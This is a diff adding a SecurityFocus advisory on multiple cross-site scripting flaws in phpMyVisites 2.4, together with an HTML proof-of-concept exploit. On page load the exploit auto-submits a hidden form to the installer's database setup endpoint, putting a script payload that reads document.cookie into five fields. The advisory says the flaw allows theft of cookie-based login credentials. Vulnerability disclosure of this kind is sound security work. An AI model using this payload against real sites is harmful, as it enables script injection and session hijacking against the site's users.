@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/52377/info
+
+phpMyVisites is prone to multiple cross-site scripting vulnerabilities because it fails to sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+phpMyVisites 2.4 is vulnerable; other versions may also be affected. 
+
+<html>
+<head>
+<title>Warning! This is Proof Of Concept Exploit for phpMyVisites 2.4 (version.php 238 2009-12-16 19:48:15Z matthieu_ $)</title>
+</head>
+<h1> Warning! This is a Proof Of Concept Exploit for phpMyVisites 2.4:<br/></h1>
+<p>// $Id: version.php 238 2009-12-16 19:48:15Z matthieu_ $
+PHPMV_VERSION 2.4
+</p>
+</h1>
+<body onload="javascript:document.forms[0].submit()">
+
+<form action="http://CHANGE_TO_RTARGET/phpmv2/index.php?mod=install_database_setup" method="post" name="form_phpmv" id="form_phpmv">
+<input value="<script>alert(document.cookie);</script>" name="form_dblogin" type="hidden" />
+<input value="<script>alert(document.cookie);</script>" name="form_dbpassword" type="hidden" />
+<input value="<script>alert(document.cookie);</script>" name="form_dbhost" type="hidden" />
+<input value="<script>alert(document.cookie);</script>" name="form_dbname" type="hidden" />
+<input value="<script>alert(document.cookie);</script>" name="form_dbprefix" type="hidden"/></td>
+
+<!--- Author: AkaStep -->
+</form>
+</body>
+</html> 
